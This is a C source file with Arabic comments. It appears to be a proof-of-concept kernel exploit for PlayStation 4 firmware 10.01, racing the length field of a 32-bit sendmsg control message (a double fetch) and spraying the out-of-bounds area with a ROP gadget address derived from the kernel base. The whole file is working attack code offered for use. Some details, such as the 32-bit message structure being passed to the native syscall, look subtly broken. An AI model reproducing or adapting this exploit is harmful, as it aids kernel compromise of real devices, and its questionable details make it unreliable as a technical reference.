#include <ps4.h>

// الإزاحات (Offsets) لنسخة 10.01 - استبدلها بما يناسب بحثك
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

// تعريف الهياكل الخاصة بـ 32-بت كما تظهر في ملف freebsd32_misc.c
struct iovec32 {
    uint32_t iov_base;
    uint32_t iov_len;
};

struct msghdr32 {
    uint32_t msg_name;
    uint32_t msg_namelen;
    uint32_t msg_iov;
    uint32_t msg_iovlen;
    uint32_t msg_control;
    uint32_t msg_controllen;
    int      msg_flags;
};

struct cmsghdr32 {
    uint32_t cmsg_len;
    int      cmsg_level;
    int      cmsg_type;
};

// ماكرو التراصف الخاص بـ FreeBSD 32-bit
#define FREEBSD32_ALIGNBYTES (4 - 1)
#define FREEBSD32_ALIGN(p) (((uint32_t)(p) + FREEBSD32_ALIGNBYTES) & ~FREEBSD32_ALIGNBYTES)

#define CONTROL_LEN 64 // حجم الـ Buffer الفعلي في ذاكرة المستخدم
uint8_t control_buf[CONTROL_LEN];
struct cmsghdr32 *cmsg;
int global_sock;

// دالة إرسال الرسائل (تستهدف استغلال الثغرة)
void *sendmsg_thread(void *arg) {
    struct msghdr32 msg = {0};
    
    msg.msg_control = (uintptr_t)control_buf;
    // نخدع النواة بأن طول المساحة 10 بايت فقط
    // هذا سيجعل ALIGN(9) = 12 تتجاوز الحدود
    msg.msg_controllen = 10; 

    while(1) {
        // Syscall 28 هو sendmsg في FreeBSD
        syscall(28, global_sock, &msg, 0);
    }
    return NULL;
}

// دالة السباق (Race) لتغيير الطول فجأة
void *race_thread(void *arg) {
    while(1) {
        // نضع قيمة تجعل الـ ALIGN يقفز خارج الحدود
        cmsg->cmsg_len = 9;   
        
        // تبديل سريع لقيمة صغيرة لتعطيل الفحص المبدئي (Double Fetch)
        cmsg->cmsg_len = 4; 
    }
    return NULL;
}

int _main(struct thread *td) {
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    uint64_t trigger_gadget = kbase + OFF_PUSH_RSP_POP_RSI_RET;

    // إنشاء Socket (مثلاً AF_INET أو AF_INET6)
    global_sock = syscall(97, 2, 2, 0); // socket(AF_INET, SOCK_DGRAM, 0)
    
    memset(control_buf, 0, CONTROL_LEN);
    
    // إعداد أول رسالة تحكم في الـ Buffer
    cmsg = (struct cmsghdr32 *)control_buf;
    cmsg->cmsg_level = 0;   // IPPROTO_IP
    cmsg->cmsg_type = 7;    // IP_RETOPTS (أو أي نوع يعالج خيارات)
    cmsg->cmsg_len = 4;

    // ملء منطقة الـ Out-of-bounds بـ ROP Gadgets
    // إذا نجح الـ Bug، النواة ستقرأ "الرسالة التالية" من هنا
    for (int i = 12; i < CONTROL_LEN - 8; i += 8) {
        *(uint64_t *)(control_buf + i) = trigger_gadget;
    }

    ScePthread t1, t2;
    // تشغيل الخيوط لبدء السباق
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    // الانتظار (في الاختبار الحقيقي قد يحدث Panic قبل الانتهاء)
    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);

    return 0;
}
